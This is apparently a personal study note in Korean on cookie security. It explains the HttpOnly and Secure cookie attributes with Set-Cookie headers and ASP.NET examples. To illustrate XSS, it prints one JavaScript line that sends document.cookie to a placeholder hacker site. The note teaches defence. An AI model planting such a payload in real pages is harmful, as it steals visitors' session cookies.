# 0212 공부 Cookie 보안

이번에 웹 클라이언트 보안을 업데이트 하면서 배우게 된 것들

- 인터넷웹 상에서,서버측에서 관리하려는 상태 정보를,
    - 서버가 아닌 클라이언트측(인터넷 웹브라우저)에 저장하며,
    - 서버측에서 필요시 마다 이를 지속성있게 활용하고자 할 때 사용
- 결국, 쿠키는 [웹 서버](http://www.ktword.co.kr/test/view/view.php?m_temp1=2730&id=1283)에 의해 통제되는 개념임

- 웹의 기능구현상 주요 단점
    - 어떤 요청에 대해 단지 하나의 응답만이 있을 뿐
        - 즉,상태유지를 위한변수를서버측에 할 수 없으며,
        - 이에따라서버측은 사용자에 대한 지속적인 상태 감시 및 상태 참조가 어려움
    - 따라서, 이를 해결하기 위한 수단으로, 사용자용 프로그램인 웹브라우저에다가, 서버측이 원하는상태 값들을 저장할 수 있게하도록 한 것이 바로 쿠키임

이번에 본 가장 큰 cookie 설정은 두 가지이다.

# **HTTP Only Cookies**

쿠키는 클라이언트에서 자바스크립트로 조회할 수 있기 때문에, 해커들은 자바스크립트로 쿠키를 가로채고자 시도를 하게 됩니다. 가장 대표적인 공격 중 하나가 CSS(Cross Site Scripting) 입니다.

```jsx
location.href = 'http://해커사이트/?cookies=' + document.cookie;
```

해커가 위와 같은 게시물을 공개게시판에 작성할 경우, 이 게시물을 읽은 다른 사용자는 알아차리기도 전에 자신의 모든 쿠키를 해커에게 전송하게 됩니다.

이러한 CSS 취약점을 해결하는 방법은, 바로 브라우저에서 쿠키에 접근할 수 없도록 제한하는 것입니다. 이러한 역할을 하는 것이 바로 HTTP Only Cookie입니다. 개발자가 다음과 같이 간단한 접미사를 쿠키생성코드에 추가함으로써 활성화 할 수 있습니다.

```jsx
Set-Cookie: 쿠키명=쿠키값; path=/; HttpOnly
```

가장 마지막에 HttpOnly라는 접미사만 추가함으로써 HTTP Only Cookie가 활성화 되며, 위에서 말한 XSS와 같은 공격이 차단되게 됩니다. HTTP Only Cookie를 설정하면 브라우저에서 해당 쿠키로 접근할 수 없게 되지만, 쿠키에 포함된 정보의 대부분이 브라우저에서 접근할 필요가 없기 때문에 HTTP Only Cookie는 기본적으로 적용하는 것이 좋습니다.

ASP.NET상에서 HTTP Only Cookie를 설정하는 방법은 매우 간단합니다. 쿠키를 추가하실 때 HttpOnly 속성을 true로 설정하시면 됩니다.

```jsx
Response.Cookies.Add(new HttpCookie("쿠키명")
{
   Value = "쿠키 값",
   HttpOnly = true
});
```

HttpOnly의 기본값은 false입니다. 만약 기본값을 true로 설정하시려면 web.config에서 다음과 같이 수정하시면 됩니다.

```jsx
<httpCookies httpOnlyCookies="true" />
```

# **Secure Cookies**

HTTP Only Cookie를 사용하면 Client에서 Javascript를 통한 쿠키 탈취문제를 예방할 수 있습니다. 하지만, Javascript가 아닌 네트워크를 직접 감청하여 쿠키를 가로챌 수도 있습니다. 미국의 NSA를 포함한 각국의 정보기관들이 Wifi 망 분석, ISP 케이블 감청을 통해 쿠키 등 개인정보를 열람하고 있다는 사실은 더 이상 공공연한 비밀이 아닙니다.

이러한 통신상의 정보유출을 막기 위해, HTTPS 프로토콜을 사용하여 데이터를 암호화하는 방법이 주로 사용되고 있습니다. HTTPS를 사용하면 쿠키 또한 암호화되어 전송되기 때문에, 제3자는 내용을 알 수 없게 됩니다.

문제는 HTTPS로 전송되어야 할 정보가, 개발자의 부주의로 HTTP를 통해 유출되는 경우가 있습니다. 예를 들어 개발자가 다음과 같은 코드를 실수로 작성할 수 있습니다.

```jsx
<img src="http://www.example.com/images/logo.png" />
```

브라우저는 http://로 시작되는 위 코드를 만나면 암호화되지 않은 상태로 쿠키를 서버로 전달하게 됩니다. 해커는 이 암호화되지 않은 요청정보를 가로채서 쿠키를 탈취하게 됩니다.

이러한 사고를 방지하는 방법은 쿠키를 생성할 때 secure 접미사를 사용하는 것입니다.

```jsx
Set-Cookie: 쿠키명=쿠키값; path=/; secure
```

위와 같이 마지막에 secure라는 접미사를 사용하여 쿠키를 생성하면, 브라우저는 HTTPS가 아닌 통신에서는 쿠키를 전송하지 않습니다.

ASP.NET에서 구현하실 때는 HttpCookie 클래스의 Secure 속성을 true로 설정해 주시면 됩니다.

```jsx
Response.Cookies.Add(new HttpCookie("쿠키명")
{
    Value = "쿠키 값",
    Secure = true
});
```

마찬가지로 Secure의 기본값은 false이기 때문에, 기본값을 true로 변경하고자 한다면 web.config에서 requireSSL을 true로 설정하시면 됩니다.
